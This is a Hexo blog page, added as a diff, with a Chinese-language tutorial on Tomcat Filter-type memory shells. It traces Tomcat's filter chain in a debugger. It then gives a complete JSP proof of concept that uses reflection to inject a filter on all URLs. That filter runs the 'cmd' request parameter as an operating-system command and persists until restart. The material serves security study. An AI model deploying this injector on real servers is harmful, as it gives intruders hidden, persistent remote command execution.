@@ -1,0 +1,697 @@
+<!DOCTYPE html>
+<html lang="en" color-mode="light">
+
+  <head>
+  <meta charset="utf-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1" />
+  <meta name="keywords" content="" />
+  <meta name="author" content="ki10Moc" />
+  <meta name="description" content="" />
+  
+  
+  <title>
+    
+      Tomcat-Filter型内存马 
+      
+      
+      |
+    
+     ki10Moc&#39;s World
+  </title>
+
+  
+    <link rel="apple-touch-icon" href="/images/1.png">
+    <link rel="icon" href="/images/1.png">
+  
+
+  <!-- Raleway-Font -->
+  <link href="https://fonts.googleapis.com/css?family=Raleway&display=swap" rel="stylesheet">
+
+  <!-- hexo site css -->
+  
+<link rel="stylesheet" href="/css/color-scheme.css">
+<link rel="stylesheet" href="/css/base.css">
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1886449_67xjft27j1l.css">
+<link rel="stylesheet" href="/css/github-markdown.css">
+<link rel="stylesheet" href="/css/highlight.css">
+<link rel="stylesheet" href="/css/comments.css">
+
+  <!-- 代码块风格 -->
+  
+
+  <!-- jquery3.3.1 -->
+  
+    <script defer type="text/javascript" src="/plugins/jquery.min.js"></script>
+  
+
+  <!-- fancybox -->
+  
+    <link href="/plugins/jquery.fancybox.min.css" rel="stylesheet">
+    <script defer type="text/javascript" src="/plugins/jquery.fancybox.min.js"></script>
+  
+  
+<script src="/js/fancybox.js"></script>
+
+
+  
+    <!-- Global site tag (gtag.js) - Google Analytics -->
+    <script async src="https://www.googletagmanager.com/gtag/js?id=G-RG82N8DQZ9"></script>
+    <script>
+      window.dataLayer = window.dataLayer || [];
+      function gtag(){dataLayer.push(arguments);}
+      gtag('js', new Date());
+
+      gtag('config', 'G-RG82N8DQZ9');
+    </script>
+  
+
+  <script>
+    var html = document.documentElement
+    const colorMode = localStorage.getItem('color-mode')
+    if (colorMode) {
+      document.documentElement.setAttribute('color-mode', colorMode)
+    }
+  </script>
+<meta name="generator" content="Hexo 6.2.0"><link rel="alternate" href="/atom.xml" title="ki10Moc's World" type="application/atom+xml">
+</head>
+
+
+  <body>
+    <div id="app">
+      <div class="header">
+  <div class="avatar">
+    <a href="/">
+      <!-- 头像取消懒加载，添加no-lazy -->
+      
+        <img src="/images/1.png" alt="">
+      
+    </a>
+    <div class="nickname"><a href="/">ki10Moc</a></div>
+  </div>
+  <div class="navbar">
+    <ul>
+      
+        <li class="nav-item" data-path="/">
+          <a href="/">主页</a>
+        </li>
+      
+        <li class="nav-item" data-path="/tags/">
+          <a href="/tags/">标签</a>
+        </li>
+      
+        <li class="nav-item" data-path="/friends/">
+          <a href="/friends/">友链</a>
+        </li>
+      
+        <li class="nav-item" data-path="/about/">
+          <a href="/about/">ki10Moc</a>
+        </li>
+      
+    </ul>
+  </div>
+</div>
+
+
+<script src="/js/activeNav.js"></script>
+
+
+
+      <div class="flex-container">
+        <!-- 文章详情页，展示文章具体内容，url形式：https://yoursite/文章标题/ -->
+<!-- 同时为「标签tag」，「朋友friend」，「分类categories」，「关于about」页面的承载页面，具体展示取决于page.type -->
+
+
+  <!-- LaTex Display -->
+
+  
+    <script async type="text/javascript" src="/plugins/mathjax/tex-chtml.js"></script>
+  
+  <script>
+    MathJax = {
+      tex: {
+        inlineMath: [['$', '$'], ['\\(', '\\)']]
+      }
+    }
+  </script>
+
+
+
+
+
+  <!-- clipboard -->
+
+  
+    <script async type="text/javascript" src="/plugins/clipboard.min.js"></script>
+  
+  
+<script src="/js/codeCopy.js"></script>
+
+
+
+
+
+
+
+  
+
+  
+
+  
+
+  
+  <!-- 文章内容页 url形式：https://yoursite/文章标题/ -->
+  <div class="container post-details" id="post-details">
+    <div class="post-content">
+      <div class="post-title">Tomcat-Filter型内存马</div>
+      <div class="post-attach">
+        <span class="post-pubtime">
+          <i class="iconfont icon-updatetime" title="Update time"></i>
+          2023-08-11 17:36:36
+        </span>
+        
+              <span class="post-tags">
+                <i class="iconfont icon-tags" title="Tags"></i>
+                
+                <span class="span--tag">
+                  <a href="/tags/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/" title="代码审计">
+                    <b>#</b> 代码审计
+                  </a>
+                </span>
+                
+                <span class="span--tag">
+                  <a href="/tags/Java%E5%AE%89%E5%85%A8/" title="Java安全">
+                    <b>#</b> Java安全
+                  </a>
+                </span>
+                
+                <span class="span--tag">
+                  <a href="/tags/%E5%86%85%E5%AD%98%E9%A9%AC/" title="内存马">
+                    <b>#</b> 内存马
+                  </a>
+                </span>
+                
+              </span>
+          
+      </div>
+      <div class="markdown-body">
+        <p>[toc]</p>
+<h2 id="0x01-前言"><a class="markdownIt-Anchor" href="#0x01-前言">#</a> 0x01 前言</h2>
+<p>上一节我们说过</p>
+<p>我们可以通过自定义过滤器来做到对用户的一些请求进行拦截修改等操作</p>
+<p><img src="https://raw.githubusercontent.com/ki10Moc/img/main/image-20230809144605968.png" alt="image-20230809144605968"></p>
+<p>动态注册恶意 Filter，并且将其放到最前面</p>
+<h2 id="0x02-tomcat-filter流程分析"><a class="markdownIt-Anchor" href="#0x02-tomcat-filter流程分析">#</a> 0x02 Tomcat Filter 流程分析</h2>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> javax.servlet.*;  </span><br><span class="line"><span class="keyword">import</span> java.io.IOException;  </span><br><span class="line">  </span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">filter</span> <span class="keyword">implements</span> <span class="title class_">Filter</span>&#123;  </span><br><span class="line">    <span class="meta">@Override</span>  </span><br><span class="line"> <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">init</span><span class="params">(FilterConfig filterConfig)</span> <span class="keyword">throws</span> ServletException &#123;  </span><br><span class="line">        System.out.println(<span class="string">&quot;Filter 初始构造完成&quot;</span>);  </span><br><span class="line"> &#125;  </span><br><span class="line">  </span><br><span class="line">    <span class="meta">@Override</span>  </span><br><span class="line"> <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">doFilter</span><span class="params">(ServletRequest servletRequest, ServletResponse servletResponse, FilterChain filterChain)</span> <span class="keyword">throws</span> IOException, ServletException &#123;  </span><br><span class="line">        System.out.println(<span class="string">&quot;执行了过滤操作&quot;</span>);  </span><br><span class="line"> filterChain.doFilter(servletRequest,servletResponse);  </span><br><span class="line"> &#125;  </span><br><span class="line">  </span><br><span class="line">    <span class="meta">@Override</span>  </span><br><span class="line"> <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">destroy</span><span class="params">()</span> &#123;  </span><br><span class="line">  </span><br><span class="line">    &#125;  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>修改 web.xml 文件，这里我们设置 url-pattern 为  <code>/filter</code>  即访问  <code>/filter</code>  才会触发</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">&lt;?xml version=<span class="string">&quot;1.0&quot;</span> encoding=<span class="string">&quot;UTF-8&quot;</span>?&gt;  </span><br><span class="line">&lt;web-app xmlns=<span class="string">&quot;http://xmlns.jcp.org/xml/ns/javaee&quot;</span>  </span><br><span class="line"> xmlns:xsi=<span class="string">&quot;http://www.w3.org/2001/XMLSchema-instance&quot;</span>  </span><br><span class="line"> xsi:schemaLocation=<span class="string">&quot;http://xmlns.jcp.org/xml/ns/javaee http://xmlns.jcp.org/xml/ns/javaee/web-app_4_0.xsd&quot;</span>  </span><br><span class="line"> version=<span class="string">&quot;4.0&quot;</span>&gt;  </span><br><span class="line"> &lt;filter&gt; &lt;filter-name&gt;filter&lt;/filter-name&gt;  </span><br><span class="line"> &lt;filter-class&gt;filter&lt;/filter-class&gt;  </span><br><span class="line"> &lt;/filter&gt;  </span><br><span class="line"> &lt;filter-mapping&gt; &lt;filter-name&gt;filter&lt;/filter-name&gt;  </span><br><span class="line"> &lt;url-pattern&gt;/filter&lt;/url-pattern&gt;  </span><br><span class="line"> &lt;/filter-mapping&gt;&lt;/web-app&gt;</span><br></pre></td></tr></table></figure>
+<p><img src="https://raw.githubusercontent.com/ki10Moc/img/main/image-20230809151139411.png" alt="image-20230809151139411"></p>
+<h3 id="在访问-filter-之后的流程分析"><a class="markdownIt-Anchor" href="#在访问-filter-之后的流程分析">#</a> 在访问 /filter 之后的流程分析</h3>
+<p>在 doFilter 打上断点开始分析</p>
+<p><img src="https://raw.githubusercontent.com/ki10Moc/img/main/image-20230809151437361.png" alt="image-20230809151437361"></p>
+<p>全局安全变量的判断，为 false，直接到代码尾部</p>
+<p><img src="https://raw.githubusercontent.com/ki10Moc/img/main/image-20230809152147101.png" alt="image-20230809152147101"></p>
+<p>接着跟进到 internalDoFilter 方法</p>
+<p><img src="https://raw.githubusercontent.com/ki10Moc/img/main/image-20230809152236004.png" alt="image-20230809152236004"></p>
+<p>加载到了 filters 对象</p>
+<p><img src="https://raw.githubusercontent.com/ki10Moc/img/main/image-20230809152954347.png" alt="image-20230809152954347"></p>
+<p>​</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">private</span> ApplicationFilterConfig[] filters = <span class="keyword">new</span> <span class="title class_">ApplicationFilterConfig</span>[<span class="number">0</span>];</span><br></pre></td></tr></table></figure>
+<p>此时我们是同时拥有两个 filter 对象</p>
+<p><img src="https://raw.githubusercontent.com/ki10Moc/img/main/image-20230809153519107.png" alt="image-20230809153519107"></p>
+<p>此时 pos=1，也就是 tomcat 自带的 filter 对象</p>
+<p>接着往后走，会调用一个一个 FilterChain 对象的 doFilter 方法</p>
+<p><img src="https://raw.githubusercontent.com/ki10Moc/img/main/image-20230809163610214.png" alt="image-20230809163610214"></p>
+<p>​</p>
+<p>然后再次回到 doFilter 方法</p>
+<p><img src="https://raw.githubusercontent.com/ki10Moc/img/main/image-20230809164240078.png" alt="image-20230809164240078"></p>
+<p>最后来到 servlet.service 方法</p>
+<p><img src="https://raw.githubusercontent.com/ki10Moc/img/main/image-20230809164416756.png" alt="image-20230809164416756"></p>
+<p>如果 filter 是自带的，可能会调用一个个 filter 对象，到最后一个 filter 对象，也就是 FilterChain 结束，调用 servlet.service 方法</p>
+<p>如果是我们自己写的 Filter 对象，则可以直接调用到 servlet.service，上一节有提到</p>
+<h3 id="在访问-filter-之前的流程分析"><a class="markdownIt-Anchor" href="#在访问-filter-之前的流程分析">#</a> 在访问 /filter 之前的流程分析</h3>
+<blockquote>
+<p>分析目的在于：假设我们基于 filter 去实现一个内存马，我们需要找到 filter 是如何被创建的。</p>
+</blockquote>
+<p>来到调用 service 前的最后一步</p>
+<p><img src="https://raw.githubusercontent.com/ki10Moc/img/main/image-20230809181708537.png" alt="image-20230809181708537"></p>
+<p>invoke 调用的 AbstractAccessLogValve</p>
+<p><img src="https://raw.githubusercontent.com/ki10Moc/img/main/image-20230809182253575.png" alt="image-20230809182253575"></p>
+<p><img src="https://raw.githubusercontent.com/ki10Moc/img/main/image-20230809183037852.png" alt="image-20230809183037852"></p>
+<p>看调用栈，因为是处理内部请求，invoke 调用顺序也就是</p>
+<p><img src="https://raw.githubusercontent.com/ki10Moc/img/main/InvokeChains.png" alt="img"></p>
+<p>下面我们关注下 filterChain</p>
+<p><img src="https://raw.githubusercontent.com/ki10Moc/img/main/image-20230810091229039.png" alt="image-20230810091229039"></p>
+<p>在 ApplicationFilterFactory 创建好 FilterChain 对象，就轮到 filterMaps</p>
+<p><img src="https://raw.githubusercontent.com/ki10Moc/img/main/image-20230810092343393.png" alt="image-20230810092343393"></p>
+<p>这里是 context 从 wrapper 中加载到现在的对象，然后 filterMaps 又从上下文获取到对象</p>
+<p>此时 filterMaps 已经加载到对象</p>
+<p>第一个是我们自定义的</p>
+<p>第二个是 tomcat 自带的</p>
+<p><img src="https://raw.githubusercontent.com/ki10Moc/img/main/image-20230810093933148.png" alt="image-20230810093933148"></p>
+<p>会遍历 FilterMaps 中的 FilterMap，如果发现符合当前请求 url 与 FilterMap 中的 urlPattern 匹配，就会进入 if</p>
+<p><img src="https://raw.githubusercontent.com/ki10Moc/img/main/image-20230810095522767.png" alt="image-20230810095522767"></p>
+<p>最终加载到</p>
+<p><img src="https://raw.githubusercontent.com/ki10Moc/img/main/image-20230810100438969.png" alt="image-20230810100438969"></p>
+<p>跟进 addFilter</p>
+<p>遍历 filters 中的 filter，进行去重，当 n 的长度 = filters.lenth，就会增加十个容量，再将 filtersconfig 添加到 filters 中</p>
+<p><img src="https://raw.githubusercontent.com/ki10Moc/img/main/image-20230810102041456.png" alt="image-20230810102041456"></p>
+<p>至此 filter 就加载完了</p>
+<p>之后接着加载 tomcat 自带的 filterconfig，接着上面的步骤走一遍</p>
+<p>最终返回 filterchain</p>
+<p><img src="https://raw.githubusercontent.com/ki10Moc/img/main/image-20230810102308974.png" alt="image-20230810102308974"></p>
+<p>最后的最后</p>
+<p>通过 filterChain.doFilter 的调用去处理 request 和 respnonse</p>
+<p>也就是去激活 servlet.service 方法进行回应</p>
+<p><img src="https://raw.githubusercontent.com/ki10Moc/img/main/image-20230810102426416.png" alt="image-20230810102426416"></p>
+<p>此图来自宽字节安全</p>
+<p><img src="https://raw.githubusercontent.com/ki10Moc/img/main/image-20210331212905616.png" alt="image-20210331212905616"></p>
+<h3 id="小结"><a class="markdownIt-Anchor" href="#小结">#</a> 小结</h3>
+<p>1、根据请求的 url 信息，从 FilterMaps 中找出与 url 相应的 Filter 名称</p>
+<p>2、根据 Filter 名称从 FilterConfigs 中获取对应的 FilterConfig</p>
+<p>3、找到对应的 FilterConfig 后添加到 Filter，最终所有的 Filter 链式调用完也即 FilterChain</p>
+<p>4、Fileterchain 调用 internalDoFilter 遍历获取 chain 中的 FilterConfig，然后获取 Filter 最终调用对应的 doFilter 方法</p>
+<p>所以可以发现，FiltersMaps 是从 StandardContext 中获取的</p>
+<p>那如果我们自定义一个 FilterMap，然后放在最前面，这样 urlpattern 去匹配的时候就会加载相应的 FilterConfig 内容，最后加载到 FilterChain 中，触发内存 shell</p>
+<h2 id="0x03-filter内存马注入"><a class="markdownIt-Anchor" href="#0x03-filter内存马注入">#</a> 0x03 Filter 内存马注入</h2>
+<p>利用版本 &gt; 7.x</p>
+<p>因为 javax.servlet.DispatcherType 类是 servlet 3 以后引入，而 Tomcat 7 以上才支持 Servlet 3</p>
+<p>当我们能直接获取 request 的时候，我们这里可以直接使用如下方法</p>
+<p>将我们的 ServletContext 转为 StandardContext 从而获取 context</p>
+<p>当 Web 容器启动的时候会为每个 Web 应用都创建一个 ServletContext 对象，代表当前 Web 应用</p>
+<h3 id="servletcontext跟standardcontext的关系"><a class="markdownIt-Anchor" href="#servletcontext跟standardcontext的关系">#</a> ServletContext 跟 StandardContext 的关系</h3>
+<p>Tomcat 中的对应的 ServletContext 实现是 ApplicationContext。在 Web 应用中获取的 ServletContext 实际上是 ApplicationContextFacade 对象，对 ApplicationContext 进行了封装，而 ApplicationContext 实例中又包含了 StandardContext 实例，以此来获取操作 Tomcat 容器内部的一些信息，例如 Servlet 的注册等。</p>
+<h3 id="如何获取standardcontext"><a class="markdownIt-Anchor" href="#如何获取standardcontext">#</a> 如何获取 StandardContext</h3>
+<ul>
+<li>由 ServletContext 转 StandardContext</li>
+</ul>
+<p>如果可以直接获取到 request 对象的话可以用这种方法</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">ServletContext</span> <span class="variable">servletContext</span> <span class="operator">=</span> request.getSession().getServletContext();</span><br><span class="line">   <span class="type">Field</span> <span class="variable">appctx</span> <span class="operator">=</span> servletContext.getClass().getDeclaredField(<span class="string">&quot;context&quot;</span>);</span><br><span class="line">   appctx.setAccessible(<span class="literal">true</span>);</span><br><span class="line">       <span class="comment">// ApplicationContext 为 ServletContext 的实现类</span></span><br><span class="line">   <span class="type">ApplicationContext</span> <span class="variable">applicationContext</span> <span class="operator">=</span> (ApplicationContext) appctx.get(servletContext);</span><br><span class="line"></span><br><span class="line">   <span class="type">Field</span> <span class="variable">stdctx</span> <span class="operator">=</span> applicationContext.getClass().getDeclaredField(<span class="string">&quot;context&quot;</span>);</span><br><span class="line">   stdctx.setAccessible(<span class="literal">true</span>);</span><br><span class="line">       <span class="comment">// 这样我们就获取到了 context </span></span><br><span class="line">   <span class="type">StandardContext</span> <span class="variable">standardContext</span> <span class="operator">=</span> (StandardContext) stdctx.get(applicationContext);</span><br></pre></td></tr></table></figure>
+<p>获取到 Context 之后 ，我们可以发现其中的 filterConfigs，filterDefs，filterMaps 这三个参数和我们的 filter 有关，那么如果我们可以控制这几个变量那么我们或许就可以注入我们的内存马</p>
+<p><strong>FilterDefs</strong>：存放 FilterDef 的数组 ，<strong>FilterDef</strong> 中存储着我们过滤器名，过滤器实例，作用 url 等基本信息</p>
+<p><strong>filterConfigs</strong>：存放 filterConfig 的数组，在 <strong>FilterConfig</strong> 中主要存放 FilterDef 和 Filter 对象等信息</p>
+<p><strong>filterMaps</strong>：一个存放 FilterMap 的数组，在 <strong>FilterMap</strong> 中主要存放了 FilterName 和 对应的 URLPattern</p>
+<p>大致流程如下：</p>
+<ol>
+<li>创建一个恶意 Filter</li>
+<li>利用 FilterDef 对 Filter 进行一个封装</li>
+<li>将 FilterDef 添加到 FilterDefs 和 FilterConfig</li>
+<li>创建 FilterMap ，将我们的 Filter 和 urlpattern 相对应，存放到 filterMaps 中（由于 Filter 生效会有一个先后顺序，所以我们一般都是放在最前面，让我们的 Filter 最先触发）</li>
+</ol>
+<p>每次请求 createFilterChain 都会依据此动态生成一个过滤链，而 StandardContext 又会一直保留到 Tomcat 生命周期结束，所以我们的内存马就可以一直驻留下去，直到 Tomcat 重启</p>
+<h3 id="poc"><a class="markdownIt-Anchor" href="#poc">#</a> poc</h3>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br></pre></td><td class="code"><pre><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;org.apache.catalina.core.ApplicationContext&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;java.lang.reflect.Field&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;org.apache.catalina.core.StandardContext&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;java.util.Map&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;java.io.IOException&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;org.apache.tomcat.util.descriptor.web.FilterDef&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;org.apache.tomcat.util.descriptor.web.FilterMap&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;java.lang.reflect.Constructor&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;org.apache.catalina.core.ApplicationFilterConfig&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;org.apache.catalina.Context&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page language=<span class="string">&quot;java&quot;</span> contentType=<span class="string">&quot;text/html; charset=UTF-8&quot;</span> pageEncoding=<span class="string">&quot;UTF-8&quot;</span>%&gt;</span><br><span class="line"></span><br><span class="line">&lt;%</span><br><span class="line">    <span class="keyword">final</span> <span class="type">String</span> <span class="variable">name</span> <span class="operator">=</span> <span class="string">&quot;KpLi0rn&quot;</span>;</span><br><span class="line">    <span class="type">ServletContext</span> <span class="variable">servletContext</span> <span class="operator">=</span> request.getSession().getServletContext();</span><br><span class="line"></span><br><span class="line">    <span class="type">Field</span> <span class="variable">appctx</span> <span class="operator">=</span> servletContext.getClass().getDeclaredField(<span class="string">&quot;context&quot;</span>);</span><br><span class="line">    appctx.setAccessible(<span class="literal">true</span>);</span><br><span class="line">    <span class="type">ApplicationContext</span> <span class="variable">applicationContext</span> <span class="operator">=</span> (ApplicationContext) appctx.get(servletContext);</span><br><span class="line"></span><br><span class="line">    <span class="type">Field</span> <span class="variable">stdctx</span> <span class="operator">=</span> applicationContext.getClass().getDeclaredField(<span class="string">&quot;context&quot;</span>);</span><br><span class="line">    stdctx.setAccessible(<span class="literal">true</span>);</span><br><span class="line">    <span class="type">StandardContext</span> <span class="variable">standardContext</span> <span class="operator">=</span> (StandardContext) stdctx.get(applicationContext);</span><br><span class="line"></span><br><span class="line">    <span class="type">Field</span> <span class="variable">Configs</span> <span class="operator">=</span> standardContext.getClass().getDeclaredField(<span class="string">&quot;filterConfigs&quot;</span>);</span><br><span class="line">    Configs.setAccessible(<span class="literal">true</span>);</span><br><span class="line">    <span class="type">Map</span> <span class="variable">filterConfigs</span> <span class="operator">=</span> (Map) Configs.get(standardContext);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (filterConfigs.get(name) == <span class="literal">null</span>)&#123;</span><br><span class="line">        <span class="type">Filter</span> <span class="variable">filter</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Filter</span>() &#123;</span><br><span class="line">            <span class="meta">@Override</span></span><br><span class="line">            <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">init</span><span class="params">(FilterConfig filterConfig)</span> <span class="keyword">throws</span> ServletException &#123;</span><br><span class="line"></span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="meta">@Override</span></span><br><span class="line">            <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">doFilter</span><span class="params">(ServletRequest servletRequest, ServletResponse servletResponse, FilterChain filterChain)</span> <span class="keyword">throws</span> IOException, ServletException &#123;</span><br><span class="line">                <span class="type">HttpServletRequest</span> <span class="variable">req</span> <span class="operator">=</span> (HttpServletRequest) servletRequest;</span><br><span class="line">                <span class="keyword">if</span> (req.getParameter(<span class="string">&quot;cmd&quot;</span>) != <span class="literal">null</span>)&#123;</span><br><span class="line">                    <span class="type">byte</span>[] bytes = <span class="keyword">new</span> <span class="title class_">byte</span>[<span class="number">1024</span>];</span><br><span class="line">                    <span class="type">Process</span> <span class="variable">process</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ProcessBuilder</span>(req.getParameter(<span class="string">&quot;cmd&quot;</span>)).start();</span><br><span class="line">                    <span class="type">int</span> <span class="variable">len</span> <span class="operator">=</span> process.getInputStream().read(bytes);</span><br><span class="line">                    servletResponse.getWriter().write(<span class="keyword">new</span> <span class="title class_">String</span>(bytes,<span class="number">0</span>,len));</span><br><span class="line">                    process.destroy();</span><br><span class="line">                    <span class="keyword">return</span>;</span><br><span class="line">                &#125;</span><br><span class="line">                filterChain.doFilter(servletRequest,servletResponse);</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="meta">@Override</span></span><br><span class="line">            <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">destroy</span><span class="params">()</span> &#123;</span><br><span class="line"></span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">        &#125;;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        <span class="type">FilterDef</span> <span class="variable">filterDef</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">FilterDef</span>();</span><br><span class="line">        filterDef.setFilter(filter);</span><br><span class="line">        filterDef.setFilterName(name);</span><br><span class="line">        filterDef.setFilterClass(filter.getClass().getName());</span><br><span class="line">        <span class="comment">/**</span></span><br><span class="line"><span class="comment">         * 将filterDef添加到filterDefs中</span></span><br><span class="line"><span class="comment">         */</span></span><br><span class="line">        standardContext.addFilterDef(filterDef);</span><br><span class="line"></span><br><span class="line">        <span class="type">FilterMap</span> <span class="variable">filterMap</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">FilterMap</span>();</span><br><span class="line">        filterMap.addURLPattern(<span class="string">&quot;/*&quot;</span>);</span><br><span class="line">        filterMap.setFilterName(name);</span><br><span class="line">        filterMap.setDispatcher(DispatcherType.REQUEST.name());</span><br><span class="line"></span><br><span class="line">        standardContext.addFilterMapBefore(filterMap);</span><br><span class="line"></span><br><span class="line">        <span class="type">Constructor</span> <span class="variable">constructor</span> <span class="operator">=</span> ApplicationFilterConfig.class.getDeclaredConstructor(Context.class,FilterDef.class);</span><br><span class="line">        constructor.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        <span class="type">ApplicationFilterConfig</span> <span class="variable">filterConfig</span> <span class="operator">=</span> (ApplicationFilterConfig) constructor.newInstance(standardContext,filterDef);</span><br><span class="line"></span><br><span class="line">        filterConfigs.put(name,filterConfig);</span><br><span class="line">        out.print(<span class="string">&quot;Inject Success !&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">%&gt;</span><br></pre></td></tr></table></figure>
+<p><img src="https://raw.githubusercontent.com/ki10Moc/img/main/image-20230810155754734.png" alt="image-20230810155754734"></p>
+<p>在运行过程中，将 Evil.jsp 删除还是可以执行命令，将服务重启就无了</p>
+<h2 id="0x04-一些点的总结"><a class="markdownIt-Anchor" href="#0x04-一些点的总结">#</a> 0x04 一些点的总结</h2>
+<p>首先是 Filter 的注册流程</p>
+<ul>
+<li>在 context 中获取 filterMaps，并遍历匹配 url 地址和请求是否匹配；</li>
+<li>如果匹配则在 context 中根据 filterMaps 中的 filterName 查找对应的 filterConfig；</li>
+<li>如果获取到 filterConfig，则将其加入到 filterChain 中</li>
+<li>后续将会循环 filterChain 中的全部 filterConfig，通过  <code>getFilter</code>  方法获取 Filter 并执行 Filter 的  <code>doFilter</code>  方法。</li>
+</ul>
+
+      </div>
+      
+        <div class="prev-or-next">
+          <div class="post-foot-next">
+            
+              <a href="/2023/08/01/%E5%86%85%E5%AD%98%E9%A9%AC%E5%9F%BA%E7%A1%80%E5%AD%A6%E4%B9%A0(%E4%B8%80)/" target="_self">
+                <i class="iconfont icon-chevronleft"></i>
+                <span>Prev</span>
+              </a>
+            
+          </div>
+          <div class="post-attach">
+            <span class="post-pubtime">
+              <i class="iconfont icon-updatetime" title="Update time"></i>
+              2023-08-11 17:36:36
+            </span>
+            
+                  <span class="post-tags">
+                    <i class="iconfont icon-tags" title="Tags"></i>
+                    
+                    <span class="span--tag">
+                      <a href="/tags/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/" title="代码审计">
+                        <b>#</b> 代码审计
+                      </a>
+                    </span>
+                    
+                    <span class="span--tag">
+                      <a href="/tags/Java%E5%AE%89%E5%85%A8/" title="Java安全">
+                        <b>#</b> Java安全
+                      </a>
+                    </span>
+                    
+                    <span class="span--tag">
+                      <a href="/tags/%E5%86%85%E5%AD%98%E9%A9%AC/" title="内存马">
+                        <b>#</b> 内存马
+                      </a>
+                    </span>
+                    
+                  </span>
+              
+          </div>
+          <div class="post-foot-prev">
+            
+              <a href="/2023/08/11/Tomcat-Listener%E5%9E%8B%E5%86%85%E5%AD%98%E9%A9%AC/" target="_self">
+                <span>Next</span>
+                <i class="iconfont icon-chevronright"></i>
